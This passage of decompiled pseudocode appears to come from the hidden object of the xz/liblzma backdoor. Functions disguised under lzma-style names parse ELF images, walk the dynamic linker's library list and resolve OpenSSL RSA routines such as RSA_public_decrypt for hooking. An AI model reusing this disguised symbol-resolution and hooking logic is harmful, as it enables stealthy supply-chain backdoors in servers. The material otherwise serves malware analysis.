  __int64 result; // rax

  ctx->runtime_addr = (__int64)&addr_hinter;
  ctx->cpuid_got_ptr = *(_QWORD *)(ctx->got_ptr + 0x18);
  set_rkctx_self(ctx);                          // a1->self = ro_gots
  set_rkctx_cpuid(ctx);                         // ctx->cpu_id_got = ro_gots.cpu_id
  result = 0LL;
  ctx->runtime_offset = 0LL;
  return result;
}
// AE20: using guessed type __int64 Lrc_read_destroy;

//----- (0000000000004050) ----------------------------------------------------
lzma_allocator *__fastcall get_lzma_allocator(__int64 a1)
{
  return (lzma_allocator *)(get_lzma_allocator_addr() + 8);
}

//----- (0000000000004070) ----------------------------------------------------
__int64 __fastcall resolve_imports(_QWORD *a1, unsigned __int64 *a2, _QWORD *a3, __int64 a4)
{
  struct_ctx *v6; // rbx
  unsigned __int64 *v7; // r13
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  void **v12; // rdi
  unsigned int *_dl_audit_preinit; // r15
  __int64 v14; // rax
  _QWORD *v15; // rdi
  int v16; // eax
  unsigned __int64 *v17; // rdx
  __int64 v19; // r9
  __int64 v20; // rax
  unsigned __int64 *v21; // r10
  unsigned __int64 *v22; // rcx
  unsigned __int64 v23; // rdx
  unsigned __int64 *i; // rsi
  unsigned __int64 v25; // rdi
  _QWORD *v26; // r11
  __int64 v27; // rax
  unsigned __int64 v28; // rsi
  unsigned __int64 v29; // r13
  unsigned int v30; // eax
  __int64 v31; // rax
  __int64 v32; // rax
  lzma_allocator *lzma_allocator; // [rsp+8h] [rbp-60h]
  lzma_allocator *lzma_allocator2; // [rsp+10h] [rbp-58h]
  __int64 v35; // [rsp+18h] [rbp-50h]
  unsigned __int64 v38; // [rsp+30h] [rbp-38h]
  unsigned __int64 *v39; // [rsp+38h] [rbp-30h]

  if ( apply_one_entry_ex(0LL, 0x6Cu, 0x10u, 5u) )
  {
    v6 = *(struct_ctx **)(a4 + 0x118);
    v7 = *(unsigned __int64 **)(*a1 + 0x10LL);
    lzma_allocator = (lzma_allocator *)get_lzma_allocator(1LL);
    lzma_allocator->elf_info = *(void **)(a1[1] + 0x10LL);
    v8 = lzma_alloc(_exit, lzma_allocator);
    v6->exit = v8;
    if ( v8 )
      ++v6->num_imports;
    v9 = lzma_alloc(0x428LL, lzma_allocator);
    v6->setlogmask = v9;
    if ( v9 )
      ++v6->num_imports;
    v10 = lzma_alloc(0x5F0LL, lzma_allocator);
    v6->setresgid = v10;
    if ( v10 )
      ++v6->num_imports;
    lzma_allocator2 = (lzma_allocator *)get_lzma_allocator(1LL);
    v11 = a1[1];
    v12 = *(void ***)(v11 + 8);
    lzma_allocator2->elf_info = *(void **)(v11 + 32);
    _dl_audit_preinit = import_lookup_get_str(v12, _dl_audit_preinit, 0);
    if ( _dl_audit_preinit )
    {
      v14 = lzma_alloc(BN_num_bits, lzma_allocator2);
      *(_QWORD *)(a4 + 104) = v14;
      if ( v14 )
        ++*(_DWORD *)(a4 + 288);
      v15 = *(_QWORD **)(a1[1] + 8LL);
      v35 = *v15 + *((_QWORD *)_dl_audit_preinit + 1);
      v16 = process_elf_seg((__int64)v15, v35, *((_QWORD *)_dl_audit_preinit + 2), 4LL);
      v17 = v7 + 300;
      if ( v16 )
      {
        while ( v7 != v17 )
        {
          v19 = a1[1];
          v20 = *(_QWORD *)(v19 + 24);
          if ( *v7 == *(_QWORD *)(v20 + 80) && v7[1] == *(_QWORD *)(v20 + 88) )
          {
            v21 = v7 + 3;
            v22 = 0LL;
            v23 = -1LL;
            for ( i = *(unsigned __int64 **)(*a1 + 16LL); i < v21; ++i )
            {
              v25 = *i;
              if ( *i >= (unsigned __int64)v21 )
              {
                v26 = (_QWORD *)v23;
                if ( (unsigned __int64)(v7 + 13) <= v23 )
                  v26 = v7 + 13;
                if ( v25 < (unsigned __int64)v26 )
                  v22 = i;
                if ( v25 < (unsigned __int64)v26 )
                  v23 = *i;
              }
            }
            if ( v23 == -1LL )
              break;
            v39 = v22;
            v38 = v23;
            lzma_allocator->elf_info = *(void **)(v19 + 16);
            v27 = lzma_alloc(2744LL, lzma_allocator);
            v6->field_28 = v27;
            if ( v27 )
              ++v6->num_imports;
            v28 = *(_QWORD *)(*a1 + 16LL);
            v29 = v38 - v28;
            v30 = v28 - (_DWORD)v39;
            if ( (unsigned __int64)v39 >= v28 )
              v30 = (_DWORD)v39 - v28;
            a3[31] = *(_QWORD *)(*a1 + 24LL) + v30;
            if ( (unsigned int)Llzma_raw_encoder_0(v35, *((_QWORD *)_dl_audit_preinit + 2) + v35, v38 - v28)
              && (unsigned int)Llzma_raw_encoder_0(a3[32], a3[32] + a3[33], v29) )
            {
              lzma_allocator->elf_info = *(void **)(a1[1] + 16LL);
              v31 = lzma_alloc(2552LL, lzma_allocator);
              v6->field_30 = v31;
              if ( v31 )
                ++v6->num_imports;
              v32 = lzma_alloc(1888LL, lzma_allocator);
              v6->field_60 = v32;
              if ( v32 )
                ++v6->num_imports;
              lzma_allocator2->elf_info = *(void **)(a1[1] + 32LL);
              *a2 = v29;
              return 1LL;
            }
            return 0LL;
          }
          ++v7;
        }
      }
      lzma_free(*(_QWORD *)(a4 + 104), lzma_allocator2);
    }
  }
  return 0LL;
}
// EA0: using guessed type __int64 __fastcall Llzma_raw_encoder_0(_QWORD, _QWORD, _QWORD);
// 4050: using guessed type __int64 __fastcall get_lzma_allocator(_QWORD);
// CB78: using guessed type __int64 __fastcall lzma_free(_QWORD, _QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (0000000000004360) ----------------------------------------------------
__int64 __fastcall Llzma_filter_flags_decode_0(struct_elf_info *a1, struct_elf_info *a2, _QWORD *a3, __int64 a4)
{
  char *str; // rax
  char *v7; // r15
  char *v8; // r13
  unsigned __int64 v9; // rax
  __int64 v10; // r10
  unsigned __int8 *v11; // rax
  __int64 *v12; // rdi
  unsigned __int64 v13; // r13
  __int64 i; // rcx
  lzma_allocator *lzma_allocator; // rax
  lzma_allocator *v16; // r15
  __int64 v17; // rax
  unsigned __int64 v18; // r10
  _DWORD *v19; // r14
  unsigned __int64 v20; // rdi
  int v21; // eax
  unsigned __int64 v22; // rax
  __int64 v23; // rdi
  __int64 v25; // rax
  unsigned __int8 *v27; // [rsp+0h] [rbp-B8h]
  char *v28; // [rsp+8h] [rbp-B0h]
  unsigned __int64 v29; // [rsp+8h] [rbp-B0h]
  __int64 v30; // [rsp+18h] [rbp-A0h]
  unsigned __int64 v31; // [rsp+18h] [rbp-A0h]
  unsigned int v32; // [rsp+2Ch] [rbp-8Ch] BYREF
  unsigned __int64 v33; // [rsp+30h] [rbp-88h] BYREF
  __int64 v34[2]; // [rsp+38h] [rbp-80h] BYREF
  char v35; // [rsp+49h] [rbp-6Fh]
  char v36; // [rsp+53h] [rbp-65h]
  int v37; // [rsp+54h] [rbp-64h]
  unsigned __int64 v38; // [rsp+68h] [rbp-50h]
  unsigned __int8 v39; // [rsp+88h] [rbp-30h]

  v32 = 0;
  v33 = 0LL;
  str = import_lookup_get_str(a1, 0xA98, 0);
  if ( !str )
    return 0LL;
  v7 = str;
  v32 = 1704;
  v28 = Llzip_decode_0((__int64)a1, &v32, 0LL);
  if ( !v28 )
    return 0LL;
  v8 = import_lookup_get_str(a2, 0x9D0, 0);
  v9 = Llzma_check_update_0((__int64)a1, &v33);
  if ( !v9 )
    return 0LL;
  v10 = Lstream_encode_1(v9, v9 + v33, (__int64)v28);
  if ( !v10 )
    return 0LL;
  if ( v8 )
  {
    v11 = &a2->elf_hdr->e_ident[*((_QWORD *)v8 + 1)];
    ++*(_DWORD *)(a4 + 288);
    *(_QWORD *)(a4 + 48) = v11;
  }
  v12 = v34;
  v30 = v10;
  v13 = v10 - 128;
  for ( i = 22LL; i; --i )
  {
    *(_DWORD *)v12 = 0;
    v12 = (__int64 *)((char *)v12 + 4);
  }
  v27 = &a1->elf_hdr->e_ident[*((_QWORD *)v7 + 1)];
  v29 = (unsigned __int64)&v27[*((_QWORD *)v7 + 2)];
  lzma_allocator = get_lzma_allocator(1LL);
  lzma_allocator->elf_info = a2;
  v16 = lzma_allocator;
  v17 = lzma_alloc(3344LL, lzma_allocator);
  v18 = v30;
  *(_QWORD *)(a4 + 144) = v17;
  if ( v17 )
    ++*(_DWORD *)(a4 + 288);
  v19 = 0LL;
  while ( v13 < v18 )
  {
    v20 = v13;
    v31 = v18;
    ++v13;
    v21 = Llzma_properties_size_0(v20, v18, (char *)v34, 267, 0LL);
    v18 = v31;
    if ( v21 )
    {
      if ( (v35 & 1) != 0 )
      {
        v22 = v38;
        if ( (v37 & 0xFF00FF00) == 83886080 )
          v22 = v34[1] + v34[0] + v38;
        if ( (v36 & 0x48) != 72 && (unsigned __int64)v27 < v22 && v29 >= v22 + 4 )
          v19 = (_DWORD *)v22;
      }
      v13 = v34[0] + v39 + 1;
    }
  }
  if ( !v19 || !(unsigned int)Llzma_properties_size_0(a3[32], a3[32] + a3[33], 0LL, 267, (__int64)v19) )
  {
    v23 = *(_QWORD *)(a4 + 144);
LABEL_25:
    lzma_free(v23, v16);
    return 0LL;
  }
  v25 = lzma_alloc(1128LL, v16);
  *(_QWORD *)(a4 + 56) = v25;
  if ( v25 )
    ++*(_DWORD *)(a4 + 288);
  if ( *v19 || *((_QWORD *)v19 - 1) )
  {
    lzma_free(*(_QWORD *)(a4 + 144), v16);
    v23 = *(_QWORD *)(a4 + 56);
    goto LABEL_25;
  }
  a3[15] = v19;
  a3[14] = v19 - 2;
  return 1LL;
}
// CB78: using guessed type __int64 __fastcall lzma_free(_QWORD, _QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (00000000000045D0) ----------------------------------------------------
__int64 __fastcall Llzma_index_buffer_encode_0(Elf64_Ehdr **p_elf, struct_elf_info *a2, struct_ctx *ctx)
{
  lzma_allocator *lzma_allocator; // r13
  __int64 result; // rax
  __int64 v6; // rax
  __int64 v7; // rax

  lzma_allocator = (lzma_allocator *)get_lzma_allocator(1LL);
  result = parse_elf(*p_elf, a2);
  if ( (_DWORD)result )
  {
    lzma_allocator->elf_info = a2;
    v6 = lzma_alloc(read, lzma_allocator);
    ctx->fn_read = v6;
    if ( v6 )
      ++ctx->num_imports;
    v7 = lzma_alloc(__errno_location, lzma_allocator);
    ctx->fn_errno_location = v7;
    if ( v7 )
      ++ctx->num_imports;
    return ctx->num_imports == 2;
  }
  return result;
}
// 4050: using guessed type __int64 __fastcall get_lzma_allocator(_QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (0000000000004650) ----------------------------------------------------
_BOOL8 __fastcall process_shared_libraries_map(Elf64_Ehdr **a1, parse_lib *lib)
{
  Elf64_Ehdr **v2; // r12
  char *str; // r13
  Elf64_Ehdr *v6; // rsi
  struc_parse_elf *v7; // rax
  char *v8; // rdi
  char v9; // al
  unsigned int v10; // eax
  struc_parse_elf *parser; // rdx
  _QWORD *v12; // rcx
  unsigned __int64 v13; // rax
  __int64 *RSA_get0_key; // r13
  __int64 *EVP_PKEY_set1_RSA; // r14
  __int64 *RSA_public_decrypt; // r15
  struct_elf_info *elf_info; // r12
  Elf64_Ehdr **ehdr; // rax
  struc_parse_elf *v19; // rax
  _QWORD *v20; // rax
  _QWORD *v21; // rax
  Elf64_Ehdr **field3; // rax
  struct_elf_info **infos; // rax
  _QWORD *global_counter; // r12
  struct_elf_info *v25; // r13
  Elf64_Ehdr **field_2; // rax
  __int64 freespaces; // rax
  __int64 v28; // rdx
  Elf64_Ehdr **field_5; // rax
  __int64 v30[6]; // [rsp+0h] [rbp-30h] BYREF

  if ( !a1 )
    return 0LL;
  v2 = a1;
  str = import_lookup_get_str(lib->infos[1], _rtld_global, 0);
  if ( str )
  {
    while ( v2[3] )
    {
      if ( !*v2 )
        return 0LL;
      v6 = v2[1];
      if ( !v6 || !v2[2] )
        return 0LL;
      if ( v6->e_ident[0] )
      {
        v8 = (char *)v2[1];
        while ( 1 )
        {
          v9 = v6->e_ident[0];
          if ( !v6->e_ident[0] )
            break;
          v6 = (Elf64_Ehdr *)((char *)v6 + 1);
          if ( v9 == 47 )
            v8 = (char *)v6;
        }
        v10 = (unsigned int)table_get(v8, (unsigned __int64)v6);
        parser = lib->parser;
        if ( v10 == 2000 )
        {
          if ( parser->field_5 )
            return 0LL;
          parser->field_5 = (__int64)v2;
        }
        else if ( v10 > 0x7D0 )
        {
          if ( v10 == 2360 )
          {
            if ( parser->field_4 )
              return 0LL;
            parser->field_4 = (__int64)v2;
          }
          else if ( v10 == 2632 )
          {
            if ( parser->field_1 )
              return 0LL;
            v12 = (_QWORD *)*((_QWORD *)lib->infos + 1);
            v13 = *v12 + *((_QWORD *)str + 1);
            if ( v13 >= (unsigned __int64)v2
              || *((_QWORD *)str + 2) < (unsigned __int64)v2 - v13
              || v2[2] != (Elf64_Ehdr *)v12[4] )
            {
              return 0LL;
            }
            parser->field_1 = (__int64)v2;
          }
        }
        else if ( v10 == 1424 )
        {
          if ( parser->field_2
            || *v2 >= (Elf64_Ehdr *)process_shared_libraries_map
            || &(*v2)[0x10000] < (Elf64_Ehdr *)process_shared_libraries_map
            || !v2[3] )
          {
            return 0LL;
          }
          parser->field_2 = (__int64)v2;
        }
        else if ( v10 == 1984 )
        {
          if ( parser->field3 )
            return 0LL;
          parser->field3 = (__int64)v2;
        }
      }
      else
      {
        if ( lib->parser->ehdr )
          return 0LL;
        lib->parser->ehdr = v2;
      }
      v7 = lib->parser;
      v2 = (Elf64_Ehdr **)v2[3];
      if ( lib->parser->ehdr && v7->field3 && v7->field_1 && v7->field_4 && v7->field_2 && v7->field_5 )
        goto LABEL_46;
    }
    v19 = lib->parser;
    if ( !lib->parser->ehdr || !v19->field3 || !v19->field_1 || !v19->field_4 || !v19->field_2 || !v19->field_5 )
      return 0LL;
LABEL_46:
    RSA_get0_key = lib->RSA_get0_key;
    EVP_PKEY_set1_RSA = lib->EVP_PKEY_set1_RSA;
    RSA_public_decrypt = lib->RSA_public_decrypt;
    elf_info = *lib->infos;
    ehdr = lib->parser->ehdr;
    if ( ehdr
      && (unsigned int)parse_elf(*ehdr, *lib->infos)
      && elf_info->relo_found
      && (elf_info->dt_flags & DF_NOW) != 0 )
    {
      v20 = (_QWORD *)Ldelta_coder_end_1(elf_info, 0x1D0);// b'RSA_public_decrypt
      *RSA_public_decrypt = (__int64)v20;       // store into lib->RSA_public_decrypt
      if ( (unsigned __int64)v20 > 0xFFFFFF )
        goto LABEL_64;
      v21 = (_QWORD *)Ldelta_coder_end_1(elf_info, 0x510);// b'EVP_PKEY_set1_RSA
      *EVP_PKEY_set1_RSA = (__int64)v21;
      if ( (unsigned __int64)v21 > 0xFFFFFF && *v21 > 0xFFFFFFuLL )
        return 0LL;
      v20 = (_QWORD *)Ldelta_coder_end_1(elf_info, 0x798);// RSA_get0_key
      *RSA_get0_key = (__int64)v20;
      if ( (unsigned __int64)v20 > 0xFFFFFF )
      {
LABEL_64:
        if ( *v20 > 0xFFFFFFuLL )
          return 0LL;
      }
      field3 = (Elf64_Ehdr **)lib->parser->field3;
      if ( field3 )
      {
        if ( (unsigned int)parse_elf(*field3, lib->infos[4]) )
        {
          infos = lib->infos;
          global_counter = (_QWORD *)lib->global_counter;
          v30[0] = 0LL;
          v25 = infos[3];
          field_2 = (Elf64_Ehdr **)lib->parser->field_2;
          if ( field_2 )
          {
            if ( (unsigned int)parse_elf(*field_2, v25) )
            {
              if ( (v25->dt_flags & 0x20) != 0 )
              {
                freespaces = maybe_find_freespaces(v25, (unsigned __int64 *)v30, 1);
                if ( v30[0] > 0x597uLL )
                {
                  v28 = v30[0] - 1432;
                  *global_counter = freespaces + 16;
                  *(_QWORD *)(freespaces + 1424) = v28;
                  field_5 = (Elf64_Ehdr **)lib->parser->field_5;
                  if ( field_5 )
                  {
                    if ( (unsigned int)parse_elf(*field_5, lib->infos[2]) )
                      return (unsigned int)Llzma_index_buffer_encode_0(
                                             (Elf64_Ehdr **)lib->parser->field_5,
                                             lib->infos[2],
                                             (struct_ctx *)lib->field_30) != 0;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0LL;
}
// 4650: using guessed type unsigned __int64 var_30[6];

//----- (0000000000004A30) ----------------------------------------------------
__int64 __fastcall process_shared_libraries(parse_lib *a1)
{
  char *str; // rax
  unsigned int v3; // edx
  __int64 v4; // rax
  struc_parse_elf *parser; // rdx
  Elf64_Ehdr **v6; // rdi
  parse_lib v8; // [rsp+8h] [rbp-40h] BYREF

  str = import_lookup_get_str(a1->infos[1], _r_debug, GLIBC_2_2_5);// if it has _r_debug
  v3 = 0;
  if ( str )
  {
    v4 = **((_QWORD **)a1->infos + 1) + *((_QWORD *)str + 1);
    v3 = 0;
    if ( *(int *)v4 > 0 )
    {
      parser = a1->parser;
      v6 = *(Elf64_Ehdr ***)(v4 + 8);
      v8.infos = a1->infos;
      v8.parser = parser;
      v8.RSA_public_decrypt = a1->RSA_public_decrypt;
      v8.EVP_PKEY_set1_RSA = a1->EVP_PKEY_set1_RSA;
      v8.RSA_get0_key = a1->RSA_get0_key;
      v8.global_counter = a1->global_counter;
      v8.field_30 = a1->field_30;
      return process_shared_libraries_map(v6, &v8);
    }
  }
  return v3;
}

//----- (0000000000004AD0) ----------------------------------------------------
__int64 __fastcall Llzma_index_iter_locate_1(__int64 a1, __int64 a2)
{
  __int64 *v4; // rdi
  __int64 v5; // rcx
  unsigned __int64 v6; // r15
  lzma_allocator *lzma_allocator; // rbx
  __int64 v8; // rax
  __int64 v9; // rdx
  __int64 v10; // r14
  __int64 v11; // rax
  int v12; // r9d
  char v13; // r10
  unsigned __int64 v14; // rdx
  char v15; // cl
  char v16; // al
  __int64 v17; // rdx
  unsigned __int16 *v18; // rsi
  __int64 v19; // rdi
  char v20; // dl
  char v21; // al
  char v22; // cl
  char v23; // al
  __int64 v24; // rcx
  _BYTE *v25; // rax
  unsigned __int8 v26; // dl
  lzma_allocator *v28; // [rsp+8h] [rbp-A0h]
  char v29; // [rsp+1Bh] [rbp-8Dh]
  int v30; // [rsp+1Ch] [rbp-8Ch]
  __int64 v31; // [rsp+28h] [rbp-80h] BYREF
  __int64 v32; // [rsp+30h] [rbp-78h]
  int v33; // [rsp+38h] [rbp-70h]
  char v34; // [rsp+43h] [rbp-65h]
  int v35; // [rsp+44h] [rbp-64h]
  char v36; // [rsp+48h] [rbp-60h]
  int v37; // [rsp+50h] [rbp-58h]
  __int64 v38; // [rsp+58h] [rbp-50h]
  unsigned __int64 v39; // [rsp+68h] [rbp-40h]

  if ( !apply_one_entry_ex(0LL, 0x97u, 0x1Fu, 9u) )
    return 0LL;
  v4 = &v31;
  v5 = 22LL;
  v6 = *(_QWORD *)a2;
  while ( v5 )
  {
    *(_DWORD *)v4 = 0;
    v4 = (__int64 *)((char *)v4 + 4);
    --v5;
  }
  lzma_allocator = get_lzma_allocator(1LL);
  lzma_allocator->elf_info = *(void **)(*(_QWORD *)(a1 + 8) + 32LL);
  v8 = lzma_alloc(3080LL, lzma_allocator);
  v9 = *(_QWORD *)(a2 + 56);
  *(_QWORD *)(v9 + 168) = v8;
  if ( v8 )
    ++*(_DWORD *)(v9 + 288);
  v10 = *(_QWORD *)(v9 + 280);
  v28 = get_lzma_allocator(1LL);
  v28->elf_info = *(void **)(*(_QWORD *)(a1 + 8) + 16LL);
  v11 = lzma_alloc(840LL, v28);
  *(_QWORD *)(v10 + 16) = v11;
  if ( v11 )
    ++*(_DWORD *)v10;
  v12 = 0;
  v13 = -1;
  while ( 1 )
  {
    v14 = *(_QWORD *)(a2 + 8);
    if ( v6 >= v14 )
    {
      lzma_allocator->elf_info = *(void **)(*(_QWORD *)(a1 + 8) + 32LL);
      lzma_free(*(_QWORD *)(*(_QWORD *)(a2 + 56) + 168LL), lzma_allocator);
      lzma_free(*(_QWORD *)(v10 + 16), v28);
      return 0LL;
    }
    v30 = v12;
    v29 = v13;
    if ( !(unsigned int)code_dasm(&v31, v6, v14) )
      return 0LL;
    v12 = v30;
    v13 = v29;
    if ( !v30 )
    {
      if ( v37 == 4150 && (v33 & 0x140) == 320 && (unsigned __int8)(BYTE1(v35) - 1) <= 1u )
      {
        v15 = v33 & 0x40;
        if ( (v33 & 0x40) != 0 )
        {
          v15 = HIBYTE(v35);
          v16 = v33 & 0x20;
          if ( (v33 & 0x20) != 0 )
          {
            v15 = (8 * v34) & 8 | HIBYTE(v35);
            v16 = 0;
            if ( (v33 & 0x1040) != 0 )
              v16 = (2 * v34) & 8 | BYTE2(v35);
          }
          else if ( (v33 & 0x1040) != 0 )
          {
            v16 = BYTE2(v35);
          }
        }
        else
        {
          v16 = 0;
          if ( (v33 & 0x1040) != 0 )
          {
            v16 = BYTE1(v33) & 0x10;
            if ( (v33 & 0x1000) != 0 )
            {
              v16 = v36;
              if ( (v33 & 0x20) != 0 )
                v16 = (8 * v34) & 8 | v36;
              else
                v15 = 0;
            }
          }
        }
        v17 = 0LL;
        if ( (v33 & 0x100) != 0 )
        {
          v17 = v38;
          if ( (v35 & 0xFF00FF00) == 83886080 )
            v17 = v32 + v31 + v38;
        }
        if ( *(_DWORD *)(a2 + 16) == v17 )
        {
          v18 = *(unsigned __int16 **)(a2 + 32);
          if ( (((int)*v18 >> v15) & 1) != 0 )
          {
            *((_BYTE *)v18 + 2) = v16;
            v12 = 1;
          }
        }
      }
      goto LABEL_74;
    }
    if ( v30 == 1 )
    {
      if ( (v37 & 0xFFFFFFFD) != 137 )
        goto LABEL_74;
      v19 = *(_QWORD *)(a2 + 24);
      v20 = v33 & 0x40;
      if ( (v33 & 0x1040) != 0 )
      {
        if ( v20 )
        {
          v21 = BYTE2(v35);
          if ( (v33 & 0x20) != 0 )
            v21 = (2 * v34) & 8 | BYTE2(v35);
          goto LABEL_48;
        }
        if ( (v33 & 0x1000) != 0 )
        {
          v21 = v36;
          if ( (v33 & 0x20) != 0 )
            v21 = (8 * v34) & 8 | v36;
LABEL_50:
          v22 = *(_BYTE *)(v19 + 2);
          if ( v22 != v21 )
            goto LABEL_52;
          goto LABEL_51;
        }
        v22 = *(_BYTE *)(v19 + 2);
        if ( v22 )
          goto LABEL_74;
        v21 = 0;
      }
      else
      {
        v21 = 0;
        if ( v20 )
        {
LABEL_48:
          v20 = HIBYTE(v35);
          if ( (v33 & 0x20) != 0 )
            v20 = (8 * v34) & 8 | HIBYTE(v35);
          goto LABEL_50;
        }
        v22 = *(_BYTE *)(v19 + 2);
        if ( v22 )
          goto LABEL_74;
      }
LABEL_51:
      if ( *(_BYTE *)(*(_QWORD *)(a2 + 32) + 2LL) == v20 )
      {
LABEL_54:
        v12 = 2;
        if ( v37 != 137 )
          v20 = v21;
        v13 = v20;
        goto LABEL_74;
      }
LABEL_52:
      if ( v20 != v22 || *(_BYTE *)(*(_QWORD *)(a2 + 32) + 2LL) != v21 )
        goto LABEL_74;
      goto LABEL_54;
    }
    if ( v37 == 296 )
    {
      v23 = 0;
      goto LABEL_68;
    }
    if ( v37 == 374 )
    {
      v23 = BYTE2(v35);
      if ( !BYTE2(v35) )
        break;
    }
LABEL_74:
    v6 += v32;
  }
  if ( (v33 & 0x1040) != 0 )
  {
    if ( (v33 & 0x40) != 0 )
    {
      v23 = v33 & 0x20;
      if ( (v33 & 0x20) != 0 )
        v23 = (2 * v34) & 8;
    }
    else
    {
      v23 = BYTE1(v33) & 0x10;
      if ( (v33 & 0x1000) != 0 )
      {
        v23 = v36;
        if ( (v33 & 0x20) != 0 )
          v23 = (8 * v34) & 8 | v36;
      }
    }
  }
LABEL_68:
  if ( v29 != v23 )
    goto LABEL_74;
  if ( v39 > 0xFF
    || (unsigned int)count_1_bits(v39) != 1
    || (v24 = *(_QWORD *)(a2 + 48),
        v25 = (_BYTE *)(**(_QWORD **)a1 + *(unsigned int *)(a2 + 16)),
        v26 = v39,
        *(_QWORD *)(v24 + 96) = v25,
        *(_BYTE *)(v24 + 104) = v26,
        (v26 & *v25) != 0) )
  {
    *(_DWORD *)(a2 + 40) = 1;
    return 0LL;
  }
  return 1LL;
}
// 4DC9: conditional instruction was optimized away because %var_8C.4==2
// CB78: using guessed type __int64 __fastcall lzma_free(_QWORD, _QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (0000000000004ED0) ----------------------------------------------------
__int64 __fastcall Llzma_index_hash_init_part_0(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4)
{
  __int64 *v6; // rdi
  __int64 v7; // rcx
  __int64 v8; // r13
  __int64 v9; // rax
  unsigned __int64 v10; // rbx
  __int64 v11; // r15
  unsigned __int64 v12; // r15
  __int64 v13; // rax
  __int16 v15; // cx
  char v16; // r9
  char v17; // dl
  __int64 v18; // r8
  unsigned __int64 v19; // rsi
  __int64 *v20; // rdi
  __int64 i; // rcx
  int v22; // r11d
  __int64 v23; // rcx
  char *v24; // rdi
  int *v25; // rax
  __int64 v26; // rcx
  char *v27; // rdi
  lzma_allocator *lzma_allocator; // [rsp+18h] [rbp-D0h]
  int v31; // [rsp+20h] [rbp-C8h] BYREF
  int v32; // [rsp+24h] [rbp-C4h] BYREF
  unsigned __int64 v33; // [rsp+28h] [rbp-C0h] BYREF
  unsigned __int64 v34; // [rsp+30h] [rbp-B8h]
  int v35; // [rsp+38h] [rbp-B0h]
  char v36[4]; // [rsp+3Ch] [rbp-ACh] BYREF
  int *v37; // [rsp+40h] [rbp-A8h]
  int *v38; // [rsp+48h] [rbp-A0h]
  int v39; // [rsp+50h] [rbp-98h]
  __int64 v40; // [rsp+58h] [rbp-90h]
  __int64 v41; // [rsp+60h] [rbp-88h]
  __int64 v42; // [rsp+68h] [rbp-80h] BYREF
  __int64 v43; // [rsp+70h] [rbp-78h]
  int v44; // [rsp+78h] [rbp-70h]
  char v45; // [rsp+83h] [rbp-65h]
  int v46; // [rsp+84h] [rbp-64h]
  char v47; // [rsp+88h] [rbp-60h]
  int v48; // [rsp+90h] [rbp-58h]
  unsigned __int64 v49; // [rsp+98h] [rbp-50h]

  if ( (unsigned int)Llzma_index_iter_rewind_cold(0x85u, 0x12u, 8u, 0) )
  {
    v6 = &v42;
    v7 = 22LL;
    v8 = *(_QWORD *)(a4 + 280);
    while ( v7 )
    {
      *(_DWORD *)v6 = 0;
      v6 = (__int64 *)((char *)v6 + 4);
      --v7;
    }
    v31 = 0;
    v32 = 0;
    lzma_allocator = get_lzma_allocator(1LL);
    lzma_allocator->elf_info = *(void **)(*(_QWORD *)(a1 + 8) + 16LL);
    v9 = lzma_alloc(896LL, lzma_allocator);
    *(_QWORD *)(v8 + 56) = v9;
    if ( v9 )
      ++*(_DWORD *)v8;
    v10 = *(_QWORD *)(a3 + 256);
    v11 = *(_QWORD *)(a3 + 264);
    BYTE2(v31) = -1;
    LOWORD(v31) = v31 | 0x80;
    LOWORD(v32) = v32 | 2;
    v12 = v10 + v11;
    BYTE2(v32) = -1;
    v13 = lzma_alloc(1680LL, lzma_allocator);
    *(_QWORD *)(v8 + 64) = v13;
    if ( v13 )
      ++*(_DWORD *)v8;
    while ( 1 )
    {
      if ( v10 >= v12 || !(unsigned int)code_dasm(&v42, v10, v12) )
        return 0LL;
      if ( v48 == 4150 && (v44 & 0x140) == 320 && (unsigned __int8)(BYTE1(v46) - 1) <= 1u )
      {
        v15 = v44 & 0x1040;
        v16 = v44 & 0x40;
        if ( (v44 & 0x40) != 0 )
        {
          v16 = HIBYTE(v46);
          v17 = v44 & 0x20;
          if ( (v44 & 0x20) != 0 )
          {
            v16 = (8 * v45) & 8 | HIBYTE(v46);
            v17 = 0;
            if ( v15 )
              v17 = BYTE2(v46) | (2 * v45) & 8;
          }
          else if ( v15 )
          {
            v17 = BYTE2(v46);
          }
        }
        else
        {
          v17 = 0;
          if ( v15 )
          {
            v17 = BYTE1(v44) & 0x10;
            if ( (v44 & 0x1000) != 0 )
            {
              v17 = v47;
              if ( (v44 & 0x20) != 0 )
                v17 = (8 * v45) & 8 | v47;
            }
          }
        }
        v18 = v43;
        if ( (v44 & 0x100) != 0 )
        {
          v19 = v49;
          if ( (v46 & 0xFF00FF00) == 83886080 )
            v19 = v43 + v42 + v49;
          if ( v19 < a2 && v19 )
          {
            v20 = (__int64 *)&v33;
            for ( i = 16LL; i; --i )
            {
              *(_DWORD *)v20 = 0;
              v20 = (__int64 *)((char *)v20 + 4);
            }
            v22 = ((int)(unsigned __int16)v31 >> v16) & 1;
            if ( v22 )
            {
              BYTE2(v31) = v17;
              v23 = 7LL;
              v24 = v36;
              v33 = v10 + v18;
              while ( v23 )
              {
                *(_DWORD *)v24 = 0;
                v24 += 4;
                --v23;
              }
              v34 = v12;
              v37 = &v31;
              v25 = &v32;
              v35 = v19;
            }
            else
            {
              if ( (((int)(unsigned __int16)v32 >> v16) & 1) == 0 )
                goto LABEL_10;
              BYTE2(v32) = v17;
              v26 = 7LL;
              v27 = v36;
              v33 = v10 + v18;
              while ( v26 )
              {
                *(_DWORD *)v27 = v22;
                v27 += 4;
                --v26;
              }
              v34 = v12;
              v35 = v19;
              v37 = &v32;
              v25 = &v31;
            }
            v38 = v25;
            v40 = a3;
            v41 = a4;
            if ( (unsigned int)Llzma_index_iter_locate_1(a1, (__int64)&v33) )
              return 1LL;
            if ( v39 )
              return 0LL;
          }
        }
      }
LABEL_10:
      v10 += v43;
    }
  }
  return 0LL;
}
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (00000000000051D0) ----------------------------------------------------
__int64 __fastcall Llzma_lz_decoder_init_0(__int64 a1, _QWORD *a2, _QWORD *a3, __int64 a4)
{
  __int64 lzma_allocator; // r14
  __int64 v9; // rdi
